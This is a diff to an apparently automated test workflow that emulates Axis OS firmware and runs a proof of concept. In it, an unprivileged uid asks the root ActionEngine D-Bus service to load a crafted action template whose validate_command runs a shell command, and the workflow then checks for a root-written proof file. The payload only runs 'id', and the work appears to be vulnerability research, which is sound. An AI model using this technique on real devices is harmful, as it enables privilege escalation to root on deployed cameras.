@@ -97,8 +97,10 @@ jobs:
           sudo chmod 666 /opt/rootfs/dev/null 2>/dev/null || true
           aarch64-linux-gnu-gcc -static -O2 -o /tmp/dbox_client targets/axis-os/poc-harness/dbox_client.c 2>/dev/null || \
             aarch64-linux-gnu-gcc -static -O2 -o /tmp/dbox_client dbox_client.c
-          file /tmp/dbox_client
-          sudo cp /tmp/dbox_client /opt/rootfs/tmp/dbox_client
+          aarch64-linux-gnu-gcc -static -O2 -o /tmp/runas targets/axis-os/poc-harness/runas.c 2>/dev/null || \
+            aarch64-linux-gnu-gcc -static -O2 -o /tmp/runas runas.c
+          file /tmp/dbox_client /tmp/runas
+          sudo cp /tmp/dbox_client /tmp/runas /opt/rootfs/tmp/
           sudo cp /usr/bin/qemu-aarch64-static /opt/rootfs/usr/bin/
 
       - name: Start dbox daemon (uid 503) and drive its control socket cross-uid
@@ -139,8 +141,36 @@ jobs:
           sudo cat /tmp/ae.log | head -20
           echo "=== actionengined alive? ==="
           pgrep -af actionengined | head -2 || echo "actionengined not running"
-          echo "=== if alive: busctl introspect ActionEngine ==="
-          timeout 20 sudo chroot /opt/rootfs /usr/bin/qemu-aarch64-static /usr/bin/busctl --no-pager introspect com.axis.Event.ActionEngine.User /com/axis/Event/ActionEngine/ActionTemplate 2>&1 | head -20
+          echo "=== if alive: tree + introspect ActionEngine.System ==="
+          timeout 20 sudo chroot /opt/rootfs /usr/bin/qemu-aarch64-static /usr/bin/busctl --no-pager tree com.axis.Event.ActionEngine.System 2>&1 | head -15
+          timeout 20 sudo chroot /opt/rootfs /usr/bin/qemu-aarch64-static /usr/bin/busctl --no-pager introspect com.axis.Event.ActionEngine.System /com/axis/Event/ActionEngine 2>&1 | head -30
+          echo "=== add-action-template file (validate_command carries the proof payload) ==="
+          sudo tee /opt/rootfs/tmp/ae_poc.xml > /dev/null <<'XML'
+<action>
+  <id>com.axis.action.poc.ae001</id>
+  <action_type>one_shot</action_type>
+  <parameters>
+  </parameters>
+  <commands>
+    <validate_command>
+      <exec_command>
+        <path>/bin/sh</path>
+        <exec_argument>-c</exec_argument>
+        <exec_argument>id > /tmp/proof_ae 2>&1</exec_argument>
+      </exec_command>
+    </validate_command>
+  </commands>
+</action>
+XML
+sudo chmod 644 /opt/rootfs/tmp/ae_poc.xml
+          echo "=== uid 150 calls AddFromFile through the dbus policy (setresuid inside chroot) ==="
+          timeout 25 sudo chroot /opt/rootfs /usr/bin/qemu-aarch64-static /tmp/runas 150 150 /usr/bin/busctl call --no-pager com.axis.Event.ActionEngine.System /com/axis/Event/ActionEngine/ActionTemplate com.axis.Event.ActionEngine.ActionTemplate AddFromFile s "/tmp/ae_poc.xml" 2>&1 | head -10
+          echo "=== addcall exit: $? ==="
+          sleep 3
+          echo "=== proof file (written by ROOT daemon if validate_command ran) ==="
+          sudo ls -la /opt/rootfs/tmp/proof_ae 2>/dev/null && sudo cat /opt/rootfs/tmp/proof_ae || echo "proof_ae NOT created"
+          echo "=== stored templates under /etc/actionengine ==="
+          sudo find /opt/rootfs/etc/actionengine -name "*poc*" 2>/dev/null | head -5
           echo "=== END actionengined attempt ==="
 
       - name: Archive logs
